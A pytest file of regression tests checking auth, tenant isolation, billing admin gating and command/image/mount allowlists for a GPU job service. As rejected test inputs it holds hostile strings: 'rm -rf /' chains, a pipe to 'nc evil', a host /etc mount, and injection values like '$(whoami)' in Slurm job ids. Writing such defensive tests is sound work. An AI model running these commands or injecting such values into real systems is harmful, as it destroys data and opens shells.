"""P0 security regression tests for the hotfix branch.

Covers:
  - worker /execute auth + command/image/mount policy (gpu_worker/server.py)
  - /billing/top-up admin gating (main.py)
  - job mutation authz: /complete/{id}, /v1/jobs/{id}/complete, /worker-ack
  - _tenant_from_key resolves the real tenant (router_jobs.py)

Run with the project venv (requires pydantic_settings for the crypto import chain):
    /home/felix/dsh-workspace/.venv-roma/bin/python -m pytest tests/test_p0_security.py -q
"""

import os
import sys
import uuid

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from starlette.testclient import TestClient
from fastapi import HTTPException
from types import SimpleNamespace

import db_adapter as db
import main
import gpu_worker.server as gws


def _uniq(prefix: str) -> str:
    return f"{prefix}-{uuid.uuid4().hex[:8]}"


@pytest.fixture(autouse=True)
def _disable_background_worker(monkeypatch):
    """Prevent startup from launching the infinite poll_and_execute loop."""
    async def _noop():
        return None

    monkeypatch.setattr(main, "init_worker", lambda: None)
    monkeypatch.setattr(main, "poll_and_execute", _noop)


@pytest.fixture()
def tenants(monkeypatch):
    """Seed two distinct tenants A/B with their own API keys."""
    a_id = _uniq("test-a")
    b_id = _uniq("test-b")
    key_a = _uniq("key-a")
    key_b = _uniq("key-b")

    db.seed_tenants({
        key_a: {"tenant_id": a_id, "name": "A"},
        key_b: {"tenant_id": b_id, "name": "B"},
    })

    # verify_api_key enforces email verification for non-admin keys — bypass it.
    monkeypatch.setattr(main, "is_email_verified", lambda api_key: True)

    # _admin_only reads main.API_KEYS (in-memory registry).
    original = dict(main.API_KEYS)
    main.API_KEYS.update({
        key_a: {"tenant_id": a_id},
        key_b: {"tenant_id": b_id},
    })
    main.API_KEYS["hotfix-admin-demo"] = {"tenant_id": "tenant-demo"}

    yield {"a_id": a_id, "b_id": b_id, "key_a": key_a, "key_b": key_b}

    main.API_KEYS.clear()
    main.API_KEYS.update(original)


def _seed_job(tenant_id, status="running"):
    jid = _uniq("job")
    db.insert_execution_job(
        job_id=jid,
        decision_id=_uniq("dec"),
        tenant_id=tenant_id,
        status=status,
        payload={},
    )
    return jid


# ─────────────────────────────────────────────────────────────────────
# /billing/top-up — admin gating
# ─────────────────────────────────────────────────────────────────────

def test_top_up_non_admin_forbidden(tenants):
    client = TestClient(main.app, raise_server_exceptions=False)
    before = main.billing_ledger.get_balance(tenants["b_id"])
    resp = client.post(
        "/billing/top-up",
        json={"tenant_id": tenants["b_id"], "amount": 999.0},
        headers={"X-API-Key": tenants["key_a"]},
    )
    assert resp.status_code == 403
    assert main.billing_ledger.get_balance(tenants["b_id"]) == before


def test_top_up_cannot_credit_other_tenant(tenants):
    client = TestClient(main.app, raise_server_exceptions=False)
    before = main.billing_ledger.get_balance(tenants["b_id"])
    # Non-admin tenant A attempts to credit tenant B — must be rejected.
    resp = client.post(
        "/billing/top-up",
        json={"tenant_id": tenants["b_id"], "amount": 500.0},
        headers={"X-API-Key": tenants["key_a"]},
    )
    assert resp.status_code == 403
    assert main.billing_ledger.get_balance(tenants["b_id"]) == before


# ─────────────────────────────────────────────────────────────────────
# Job mutation authz (main.py + router_jobs.py)
# ─────────────────────────────────────────────────────────────────────

def test_complete_requires_auth(tenants):
    jid = _seed_job(tenants["a_id"])
    client = TestClient(main.app, raise_server_exceptions=False)
    resp = client.post(f"/complete/{jid}")
    assert resp.status_code == 401
    assert db.get_execution_job(jid)["status"] == "running"


def test_complete_cross_tenant_404(tenants):
    jid = _seed_job(tenants["a_id"])
    client = TestClient(main.app, raise_server_exceptions=False)
    resp = client.post(f"/complete/{jid}", headers={"X-API-Key": tenants["key_b"]})
    assert resp.status_code == 404
    assert db.get_execution_job(jid)["status"] == "running"


def test_v1_complete_requires_auth(tenants):
    jid = _seed_job(tenants["a_id"])
    client = TestClient(main.app, raise_server_exceptions=False)
    resp = client.post(f"/v1/jobs/{jid}/complete")
    assert resp.status_code == 401
    assert db.get_execution_job(jid)["status"] == "running"


def test_v1_complete_cross_tenant_404(tenants):
    jid = _seed_job(tenants["a_id"])
    client = TestClient(main.app, raise_server_exceptions=False)
    resp = client.post(f"/v1/jobs/{jid}/complete", headers={"X-API-Key": tenants["key_b"]})
    assert resp.status_code == 404
    assert db.get_execution_job(jid)["status"] == "running"


def test_worker_ack_cross_tenant_404(tenants):
    jid = _seed_job(tenants["a_id"])
    client = TestClient(main.app, raise_server_exceptions=False)
    resp = client.post(
        f"/v1/jobs/{jid}/worker-ack",
        json={"action": "complete"},
        headers={"X-API-Key": tenants["key_b"]},
    )
    assert resp.status_code == 404
    assert db.get_execution_job(jid)["status"] == "running"


# ─────────────────────────────────────────────────────────────────────
# _tenant_from_key
# ─────────────────────────────────────────────────────────────────────

def test_tenant_from_key_returns_real_tenant(tenants):
    from router_jobs import _tenant_from_key
    assert _tenant_from_key(tenants["key_a"]) == tenants["a_id"]
    assert _tenant_from_key(tenants["key_b"]) == tenants["b_id"]


def test_tenant_from_key_invalid_key_401(tenants):
    from router_jobs import _tenant_from_key
    with pytest.raises(HTTPException) as exc_info:
        _tenant_from_key("nonexistent-key-xyz")
    assert exc_info.value.status_code == 401


# ─────────────────────────────────────────────────────────────────────
# gpu_worker /execute — worker token + execution policy
# ─────────────────────────────────────────────────────────────────────

def test_execute_requires_worker_token(monkeypatch):
    monkeypatch.setattr(gws, "WORKER_TOKEN", "sekret-token")
    monkeypatch.setattr(gws.state, "gpu_available", True)
    called = []
    monkeypatch.setattr(gws.subprocess, "run", lambda *a, **k: called.append(a))

    client = TestClient(gws.app, raise_server_exceptions=False)
    resp = client.post(
        "/execute",
        json={"job_id": "j1", "command": "python -c 'print(1)'"},
    )
    assert resp.status_code == 401
    assert called == []  # command must NOT run


def test_execute_wrong_worker_token(monkeypatch):
    monkeypatch.setattr(gws, "WORKER_TOKEN", "sekret-token")
    monkeypatch.setattr(gws.state, "gpu_available", True)
    called = []
    monkeypatch.setattr(gws.subprocess, "run", lambda *a, **k: called.append(a))

    client = TestClient(gws.app, raise_server_exceptions=False)
    resp = client.post(
        "/execute",
        json={"job_id": "j1", "command": "python -c 'print(1)'"},
        headers={"X-Roma-Worker-Token": "wrong"},
    )
    assert resp.status_code == 401
    assert called == []


def test_execute_rejects_command_outside_allowlist(monkeypatch):
    monkeypatch.setattr(gws, "WORKER_TOKEN", "sekret-token")
    monkeypatch.setattr(gws.state, "gpu_available", True)
    called = []
    monkeypatch.setattr(gws.subprocess, "run", lambda *a, **k: called.append(a))

    client = TestClient(gws.app, raise_server_exceptions=False)
    resp = client.post(
        "/execute",
        json={"job_id": "j1", "command": "sh -c 'id'"},
        headers={"X-Roma-Worker-Token": "sekret-token"},
    )
    assert resp.status_code == 403
    assert called == []


def test_execute_rejects_mount_paths(monkeypatch):
    monkeypatch.setattr(gws, "WORKER_TOKEN", "sekret-token")
    monkeypatch.setattr(gws.state, "gpu_available", True)
    called = []
    monkeypatch.setattr(gws.subprocess, "run", lambda *a, **k: called.append(a))

    client = TestClient(gws.app, raise_server_exceptions=False)
    resp = client.post(
        "/execute",
        json={
            "job_id": "j1",
            "command": "python -c 'print(1)'",
            "mount_paths": {"/host/etc": "/etc"},
        },
        headers={"X-Roma-Worker-Token": "sekret-token"},
    )
    assert resp.status_code == 403
    assert called == []


def test_execute_rejects_image_outside_allowlist(monkeypatch):
    monkeypatch.setattr(gws, "WORKER_TOKEN", "sekret-token")
    monkeypatch.setattr(gws.state, "gpu_available", True)
    called = []
    monkeypatch.setattr(gws.subprocess, "run", lambda *a, **k: called.append(a))

    client = TestClient(gws.app, raise_server_exceptions=False)
    resp = client.post(
        "/execute",
        json={"job_id": "j1", "command": "python -c 'print(1)'", "image": "alpine:latest"},
        headers={"X-Roma-Worker-Token": "sekret-token"},
    )
    assert resp.status_code == 403
    assert called == []


def test_validate_execute_job_allowlist():
    # allowed binary → argv list (no shell)
    argv = gws._validate_execute_job(
        gws.JobRequest(job_id="j1", command="python train.py --epochs 1")
    )
    assert argv == ["python", "train.py", "--epochs", "1"]

    # non-allowlisted binary → rejected
    with pytest.raises(HTTPException) as e1:
        gws._validate_execute_job(gws.JobRequest(job_id="j1", command="sh -c 'id'"))
    assert e1.value.status_code == 403

    # shell metacharacter binary is not in the allowlist → rejected
    with pytest.raises(HTTPException) as e2:
        gws._validate_execute_job(gws.JobRequest(job_id="j1", command="python; rm -rf /"))
    assert e2.value.status_code == 403

    # any mount_paths → rejected
    with pytest.raises(HTTPException) as e3:
        gws._validate_execute_job(
            gws.JobRequest(job_id="j1", command="python -c 1", mount_paths={"/host": "/c"})
        )
    assert e3.value.status_code == 403

    # arbitrary image → rejected
    with pytest.raises(HTTPException) as e4:
        gws._validate_execute_job(
            gws.JobRequest(job_id="j1", command="python -c 1", image="alpine:latest")
        )
    assert e4.value.status_code == 403


def test_worker_token_fail_closed_when_unset(monkeypatch):
    monkeypatch.setattr(gws, "WORKER_TOKEN", "")
    assert gws._worker_token_valid("anything") is False
    assert gws._worker_token_valid("") is False


def test_worker_token_valid(monkeypatch):
    monkeypatch.setattr(gws, "WORKER_TOKEN", "sekret-token")
    assert gws._worker_token_valid("sekret-token") is True
    assert gws._worker_token_valid("wrong") is False
    assert gws._worker_token_valid(None) is False


def test_empty_tenant_id_rejected_401(monkeypatch):
    """A key that resolves to an empty tenant_id must be treated as invalid (401)."""
    key = _uniq("key-empty")
    db.seed_tenants({key: {"tenant_id": "", "name": "empty"}})

    calls = []
    fake_client = SimpleNamespace(
        config=SimpleNamespace(webhook_secret="wh"),
        create_order=lambda **kwargs: calls.append(kwargs) or {"Url": "https://example.com"},
    )
    monkeypatch.setattr(main, "CLOUDPAYMENTS_ENABLED", True)
    monkeypatch.setattr(main, "cloudpayments_client", fake_client)
    # is_email_verified is not needed: the empty-tenant_id 401 happens before it.

    client = TestClient(main.app, raise_server_exceptions=False)
    resp = client.post(
        "/billing/create-checkout-session",
        json={"plan": "pro"},
        headers={"X-API-Key": key},
    )
    assert resp.status_code == 401
    assert calls == []  # create_order must not be called


def test_worker_run_job_no_shell(monkeypatch):
    import subprocess
    import worker

    calls = []
    def fake_run(argv, **kwargs):
        calls.append((argv, kwargs))
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    monkeypatch.setattr(subprocess, "run", fake_run)

    # disallowed binary -> rejected, subprocess not called
    assert worker.run_job("echo hi; rm -rf /")["success"] is False
    assert calls == []

    # allowed binary but shell metacharacters -> run as argv with shell=False,
    # metacharacters become literal args (never interpreted by a shell)
    res = worker.run_job("python -c 'print(1)' && touch /tmp/pwn")
    assert res["success"] is True
    assert len(calls) == 1
    argv, kwargs = calls[0]
    assert kwargs.get("shell") is False
    assert "&&" in argv and "touch" in argv


def test_local_workers_no_shell(monkeypatch):
    import subprocess
    import local_worker
    import gpu_worker.local_worker as gpu_lw

    calls = []
    def fake_run(argv, **kwargs):
        calls.append((argv, kwargs))
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    monkeypatch.setattr(subprocess, "run", fake_run)

    for _, fn in ((local_worker, local_worker.run_cmd), (gpu_lw, gpu_lw.run_cmd)):
        assert fn("echo hi; rm -rf /")["ok"] is False
        assert fn("python -c 'print(1)' | nc evil")["ok"] is True
    assert len(calls) == 2  # one allowed python run per module
    assert all(c[1].get("shell") is False for c in calls)


def test_slurm_id_metachar_rejected(monkeypatch):
    from scheduler.slurm_plugin import SlurmPlugin, _SLURM_ID_RE

    p = SlurmPlugin()
    p.enabled = True

    ssh_calls = []
    def fake_ssh_exec(cmd, timeout=30):
        ssh_calls.append(cmd)

    monkeypatch.setattr(p, "_ssh_exec", fake_ssh_exec)

    for bad in ["123;rm -rf /", "12 && echo", "a|b", "`id`", "$(whoami)",
                "-uroot", "--x", "-u root", "-1"]:
        st = p.get_status(bad)
        assert st["status"] == "error"
        assert "invalid slurm_job_id" in st["message"]
        cc = p.cancel(bad)
        assert cc["status"] == "error"
        assert "invalid slurm_job_id" in cc["message"]

    # The validator must reject BEFORE any SSH command is issued.
    assert ssh_calls == []

    # ordinary numeric / string ids are accepted by the validator
    for good in ["12345", "job.1_2", "job-abc_123.4"]:
        assert _SLURM_ID_RE.match(good)
